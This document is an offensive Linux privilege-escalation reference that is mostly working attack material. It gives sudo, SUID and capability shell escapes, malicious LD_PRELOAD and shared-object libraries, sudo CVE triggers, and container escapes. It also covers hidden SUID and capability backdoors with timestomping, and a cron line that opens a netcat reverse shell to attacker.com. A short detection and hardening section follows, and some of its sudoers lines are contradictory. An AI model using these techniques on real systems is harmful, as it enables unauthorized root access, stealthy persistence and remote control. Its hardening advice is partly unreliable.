# Linux Privilege Abuse Reference

## ELI5: The Janitor's Master Key Problem

### The Building Access Analogy

Imagine a corporate building with different access levels:

```
Regular Employee = Normal user
  ↓ (can't access executive floor)
Janitor = User with special privileges
  ↓ (has keys to clean everywhere)
Building Owner = Root
  ↓ (owns everything)
```

**The Problem:**
- Janitors need access to clean
- But they shouldn't own the building
- Linux gives "cleaning keys" (sudo, SUID, capabilities)
- We exploit these keys to become the owner!

### The Three Types of Special Keys

**Sudo** = "Temporary CEO Powers"
```
Employee: "I need to install software"
Company: "OK, type 'sudo' and you're temporarily CEO"
Attacker: "Cool, sudo bash = permanent CEO!"
```

**SUID** = "Magic Uniform"
```
Person wears janitor uniform → Gets janitor powers
Program has SUID bit → Runs with owner's powers
Attacker finds SUID program → Exploits it → Gets root!
```

**Capabilities** = "Specific Superpowers"
```
Normal person: No superpowers
Person with CAP_NET_ADMIN: Can control network
Person with CAP_SYS_ADMIN: Basically God
```

### Why These Exist

```
Admin: "I need users to restart Apache without root password"
Linux: "Use sudo for specific commands!"
Result: Misconfiguration = compromise

Developer: "My backup program needs to read all files"
Linux: "Make it SUID root!"
Result: Buffer overflow = root shell

Docker: "Container needs to bind port 80"
Linux: "Give it CAP_NET_BIND_SERVICE!"
Result: Capability abuse = privilege escalation
```

## Sudo Exploitation Techniques

### Sudo Enumeration

```bash
# Check sudo version (for vulnerability research)
sudo -V

# List sudo privileges
sudo -l

# List without password (if possible)
sudo -ln

# Detailed sudo permissions
cat /etc/sudoers 2>/dev/null
ls -la /etc/sudoers.d/ 2>/dev/null

# Find all sudo-related files
find /etc -name "*sudo*" 2>/dev/null

# Check sudo logs
cat /var/log/auth.log | grep sudo
cat /var/log/secure | grep sudo

# Environment variables sudo preserves
sudo -l | grep env_

# Check for sudo tokens
find /var/run/sudo -type f 2>/dev/null
find /var/lib/sudo -type f 2>/dev/null

# Parse complex sudoers
#!/bin/bash
# Extract actionable sudo rules
sudo -l 2>/dev/null | grep "(root)" | while read line; do
    if echo "$line" | grep -q "NOPASSWD"; then
        echo "[+] NOPASSWD: $line"
    fi
    if echo "$line" | grep -q "ALL"; then
        echo "[+] ALL permissions: $line"
    fi
    if echo "$line" | grep -q "/bin/\|/usr/bin/"; then
        echo "[+] Binary access: $line"
    fi
done
```

### Common Sudo Misconfigurations

```bash
# NOPASSWD abuse
# If sudoers contains: user ALL=(ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'
sudo vim -c ':shell'

# Less abuse
# If sudoers contains: user ALL=(ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
!/bin/bash

# More/Man abuse
sudo more /etc/passwd
!/bin/bash

sudo man man
!/bin/bash

# Find command abuse
sudo find /etc -exec /bin/bash \;
sudo find /etc -exec bash -i \;

# AWK abuse
sudo awk 'BEGIN {system("/bin/bash")}'

# Perl abuse
sudo perl -e 'exec "/bin/bash";'

# Python abuse
sudo python -c 'import os; os.system("/bin/bash")'
sudo python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ruby abuse
sudo ruby -e 'exec "/bin/bash"'

# Tar abuse
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# Zip abuse
echo "test" > /tmp/test.txt
sudo zip /tmp/test.zip /tmp/test.txt -T --unzip-command="bash -c /bin/bash"

# Nano abuse
sudo nano
^R^X
reset; sh 1>&0 2>&0

# Git abuse
sudo git help config
!/bin/bash

# FTP abuse
sudo ftp
!/bin/bash
```

### LD_PRELOAD Exploitation

```c
// Create malicious shared library
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

// Compile:
// gcc -fPIC -shared -o shell.so shell.c -nostartfiles

// If sudo preserves LD_PRELOAD:
// sudo LD_PRELOAD=/tmp/shell.so any_command
```

```bash
# Check if LD_PRELOAD is preserved
sudo -l | grep LD_PRELOAD

# If env_keep+=LD_PRELOAD exists:
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/id

# Alternative LD_LIBRARY_PATH
# If env_keep+=LD_LIBRARY_PATH:
ldd /usr/bin/any_sudo_allowed_binary
# Create fake library matching one from ldd output
gcc -o /tmp/libcrypt.so.1 -shared -fPIC shell.c
sudo LD_LIBRARY_PATH=/tmp any_sudo_allowed_binary
```

### Sudo Token Hijacking

```bash
# Sudo caches credentials for ~5 minutes
# If another user has valid sudo token:

# Find sudo timestamps
ls -la /var/run/sudo/ts/

# Process injection to reuse token
# If ptrace is allowed:
gdb -p $(pgrep -u victim_user bash)
(gdb) call system("sudo bash")
(gdb) detach
(gdb) quit

# Token reuse via shared memory
# If you can access /var/run/sudo/ts/:
cp /var/run/sudo/ts/victim_user /var/run/sudo/ts/$(whoami)
sudo bash  # May work if timestamp format matches
```

### Sudo Version Vulnerabilities

```bash
# CVE-2019-14287 - Sudo bypass (< 1.8.28)
# If sudoers contains: user ALL=(ALL, !root) /bin/bash
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash

# CVE-2021-3156 - Heap overflow (1.8.2 - 1.9.5p1)
# Baron Samedit exploit
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# CVE-2019-18634 - Buffer overflow (< 1.8.26)
# If pwfeedback is enabled
perl -e 'print(("A" x 100 . "\x00") x 50)' | sudo -S id

# Check for vulnerable versions
sudo -V | head -1
# Compare with CVE databases
```

## SUID/SGID Binary Exploitation

### Finding SUID/SGID Binaries

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null

# Find SUID owned by root
find / -uid 0 -perm -4000 -type f 2>/dev/null

# More detailed SUID search
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Find recently modified SUID
find / -perm -4000 -type f -mtime -7 2>/dev/null

# Find SUID in unusual locations
find /tmp /var/tmp /dev/shm /home -perm -4000 2>/dev/null

# Compare against known good list
# On clean system:
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid_clean.txt
# On target:
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid_target.txt
diff /tmp/suid_clean.txt /tmp/suid_target.txt
```

### GTFOBins Exploitation

```bash
# Common SUID binaries from GTFOBins

# bash (if SUID)
./bash -p

# find
find . -exec /bin/bash -p \; -quit

# vim
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# less
less /etc/passwd
!/bin/bash -p

# more
more /etc/passwd
!/bin/bash -p

# nano
nano
^R^X
reset; sh 1>&0 2>&0

# cp (copy /bin/bash and set SUID)
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

# mv (overwrite /etc/passwd)
echo 'root2:$6$SALT$HASH:0:0:root:/root:/bin/bash' > /tmp/passwd
mv /tmp/passwd /etc/passwd

# nmap (older versions)
nmap --interactive
!sh

# awk
awk 'BEGIN {system("/bin/bash -p")}'

# perl
perl -e 'exec "/bin/bash";'

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# php
php -r "pcntl_exec('/bin/bash', ['-p']);"

# ruby
ruby -e 'exec "/bin/bash"'

# tar
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# zip
TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'bash #'
```

### Custom SUID Exploitation

```c
// Exploiting vulnerable SUID binary
// If SUID binary has buffer overflow:

#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char buffer[64];

    if(argc > 1) {
        strcpy(buffer, argv[1]);  // Vulnerable!
    }

    return 0;
}

// Exploit:
// ./vulnerable_suid $(python -c 'print "A"*76 + "\xef\xbe\xad\xde"')

// Path injection if SUID uses system():
// If SUID binary calls: system("ls");
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/ls
echo 'bash -p' >> /tmp/ls
chmod +x /tmp/ls
./vulnerable_suid  # Executes our fake ls

// Library injection:
// If SUID binary has missing libraries:
ldd /usr/local/bin/vulnerable_suid
# If shows: libmissing.so => not found

// Create malicious library:
echo 'void _init() { setuid(0); system("/bin/bash -p"); }' > /tmp/libmissing.c
gcc -shared -fPIC -o /tmp/libmissing.so /tmp/libmissing.c
export LD_LIBRARY_PATH=/tmp
./vulnerable_suid
```

### Shared Object Injection

```bash
# Find SUID binaries with missing libraries
for binary in $(find / -perm -4000 -type f 2>/dev/null); do
    ldd "$binary" 2>/dev/null | grep "not found" && echo "Vulnerable: $binary"
done

# Find binaries using specific library paths
strace /usr/local/bin/suid_binary 2>&1 | grep -E "open|access" | grep "\.so"

# If binary tries to load from writable directory:
# access("/home/user/.config/library.so", R_OK) = -1 ENOENT

# Create malicious library:
cat > /home/user/.config/library.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /home/user/.config/library.so /home/user/.config/library.c
./suid_binary  # Loads our malicious library
```

## Linux Capabilities Abuse

### Understanding Capabilities

```bash
# List all capabilities
capsh --print

# Find binaries with capabilities
getcap -r / 2>/dev/null

# Check specific binary
getcap /usr/bin/python3

# Set capability (requires root)
setcap cap_setuid+ep /usr/bin/python3

# Remove capability
setcap -r /usr/bin/python3

# Common dangerous capabilities:
# CAP_SETUID - Can change UID to any value (become root)
# CAP_SETGID - Can change GID to any value
# CAP_DAC_OVERRIDE - Can bypass file permissions
# CAP_DAC_READ_SEARCH - Can read any file
# CAP_SYS_ADMIN - Basically root (mount, etc.)
# CAP_SYS_PTRACE - Can ptrace any process
# CAP_SYS_MODULE - Can load kernel modules
# CAP_NET_ADMIN - Network configuration control
# CAP_NET_RAW - Can create raw packets
```

### Exploiting Specific Capabilities

```bash
# CAP_SETUID - Become root
# If python has cap_setuid+ep:
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid+ep:
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# CAP_DAC_OVERRIDE - Read any file
# If vim has cap_dac_override+ep:
vim /etc/shadow  # Can read despite permissions

# CAP_DAC_READ_SEARCH - Read any file
# If tar has cap_dac_read_search+ep:
tar -czf /tmp/shadow.tar.gz /etc/shadow
tar -xzf /tmp/shadow.tar.gz

# CAP_NET_RAW - Sniff traffic
# If tcpdump has cap_net_raw+ep:
tcpdump -i any -w /tmp/capture.pcap

# CAP_SYS_ADMIN - Mount filesystems
# If python has cap_sys_admin+ep:
python3 -c 'import os; os.system("mount -o rw,remount /")'

# CAP_SYS_PTRACE - Debug any process
# If gdb has cap_sys_ptrace+ep:
gdb -p 1  # Attach to init
(gdb) call system("bash")

# CAP_SYS_MODULE - Load kernel modules
# Create malicious kernel module and load it

# CAP_CHOWN - Change file ownership
# If ruby has cap_chown+ep:
ruby -e 'require "fileutils"; FileUtils.chown(0, 0, "/etc/passwd")'
```

### Capability-based Privilege Escalation

```c
// Exploit binary with capabilities
// cap_exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/capability.h>
#include <unistd.h>

int main() {
    // If binary has CAP_SETUID
    cap_t caps = cap_get_proc();
    cap_value_t cap_list[1] = {CAP_SETUID};

    if(cap_set_flag(caps, CAP_EFFECTIVE, 1, cap_list, CAP_SET) == 0) {
        cap_set_proc(caps);
        setuid(0);
        setgid(0);
        system("/bin/bash");
    }

    cap_free(caps);
    return 0;
}

// Compile: gcc -o cap_exploit cap_exploit.c -lcap
// Set capability: sudo setcap cap_setuid+ep cap_exploit
// Run: ./cap_exploit
```

## Container Escapes

### Docker Socket Abuse

```bash
# Check if docker socket is accessible
ls -la /var/run/docker.sock

# If accessible, mount host filesystem
docker run -v /:/host -it ubuntu chroot /host /bin/bash

# List containers
docker ps

# Execute in existing container as root
docker exec -it -u 0 container_name /bin/bash

# Create privileged container
docker run --privileged -v /:/host -it ubuntu
# In container:
chroot /host
# Now you're root on host

# Mount host's /etc
docker run -v /etc:/host_etc -it ubuntu
echo 'root2:$6$HASH:0:0:root:/root:/bin/bash' >> /host_etc/passwd
```

### Privileged Container Escape

```bash
# Inside privileged container
# Method 1: Direct kernel module loading
cat > /tmp/escape.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
    system("/bin/bash -c 'echo root2:x:0:0::/root:/bin/bash >> /etc/passwd'");
    return 0;
}

void cleanup_module(void) {}
EOF

make -C /lib/modules/$(uname -r)/build M=/tmp obj-m=escape.o modules
insmod /tmp/escape.ko

# Method 2: Mount host filesystem
fdisk -l  # Find host disk
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host

# Method 3: Process namespace escape
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### Capability-based Container Escape

```bash
# If container has dangerous capabilities
capsh --print

# CAP_SYS_ADMIN - Mount host filesystem
mount -t proc none /mnt/proc
grep -r "docker\|lxc" /mnt/proc/*/mountinfo

# CAP_SYS_PTRACE - Inject into host process
# Find host processes
grep -r "^1$" /proc/*/status 2>/dev/null

# CAP_NET_ADMIN - Network manipulation
ip addr add 10.10.10.10/24 dev eth0
ip route add default via 10.10.10.1
```

## Advanced Persistence via Privileges

### Capability-based Backdoors

```bash
# Add capability to common binary
cp /bin/bash /tmp/.bash
chmod +x /tmp/.bash
setcap cap_setuid+ep /tmp/.bash

# Usage: /tmp/.bash -p

# Hide with attributes
chattr +i /tmp/.bash
lsattr /tmp/.bash

# Create capability-based cron
echo '* * * * * /usr/bin/python3 -c "import os; os.setuid(0); os.system(\"nc -e /bin/bash attacker.com 4444\")"' | crontab -

# If python3 has capabilities:
setcap cap_setuid+ep /usr/bin/python3
```

### SUID Backdoors

```bash
# Traditional SUID backdoor
cp /bin/bash /tmp/.shell
chmod 4755 /tmp/.shell
# Usage: /tmp/.shell -p

# Hidden SUID with obscure name
cp /bin/bash "/tmp/
"  # Newline in filename
chmod 4755 "/tmp/
"

# SUID in unusual location
cp /bin/bash /dev/shm/...
chmod 4755 /dev/shm/...

# Timestomp to hide
touch -r /bin/ls /tmp/.shell
```

## Detection and Defense

### Blue Team Detection

```bash
# Monitor for SUID changes
find / -perm -4000 -type f -exec md5sum {} \; > /tmp/suid_baseline.txt
# Later:
find / -perm -4000 -type f -exec md5sum {} \; > /tmp/suid_current.txt
diff /tmp/suid_baseline.txt /tmp/suid_current.txt

# Monitor capability changes
getcap -r / 2>/dev/null > /tmp/cap_baseline.txt

# Audit sudo usage
aureport -x --summary
ausearch -c sudo

# Monitor for privilege escalation
auditctl -a always,exit -F arch=b64 -S setuid -S setgid -S setreuid -S setregid -F auid!=0

# Check for LD_PRELOAD
strings /proc/*/environ | grep LD_PRELOAD

# Monitor process elevation
ps -eo pid,uid,euid,cmd | awk '$2 != $3'
```

### Hardening Recommendations

```bash
# Restrict sudo
# In /etc/sudoers:
Defaults requiretty
Defaults use_pty
Defaults logfile="/var/log/sudo.log"
Defaults !env_reset
Defaults env_reset
Defaults env_keep -= "LD_PRELOAD LD_LIBRARY_PATH"

# Remove unnecessary SUID
chmod -s /unnecessary/suid/binary

# Restrict capabilities
setcap -r /usr/bin/binary

# Enable SELinux/AppArmor
setenforce 1
aa-enforce /etc/apparmor.d/*

# Regular audits
#!/bin/bash
# Daily SUID/capability audit
{
    echo "=== SUID Audit $(date) ==="
    find / -perm -4000 -type f 2>/dev/null
    echo "=== Capability Audit ==="
    getcap -r / 2>/dev/null
} | mail -s "Daily Privilege Audit" security@company.com
```

## Quick Reference

```bash
# Sudo
sudo -l
sudo -V

# SUID
find / -perm -4000 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Common exploits
sudo vim -c ':!/bin/bash'
./bash -p
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

## Conclusion

Linux privilege abuse is about finding and exploiting trust. The system trusts certain programs with special powers - we abuse that trust. Key principles:

1. **Always enumerate thoroughly** - Miss nothing
2. **Check version numbers** - Old = vulnerable
3. **Think creatively** - Combine techniques
4. **GTFOBins is your friend** - Check every binary
5. **Capabilities are underrated** - Often overlooked

Remember: Linux gives rope to hang itself with sudo, SUID, and capabilities. Your job is to find that rope.

## Lab Exercises

1. **Sudo Master**: Find and exploit 5 different sudo misconfigurations
2. **SUID Hunter**: Exploit 3 different SUID binaries
3. **Capability Explorer**: Escalate using 3 different capabilities
4. **Container Escape**: Break out of a Docker container
5. **Persistence Challenge**: Create 3 hidden backdoors using privileges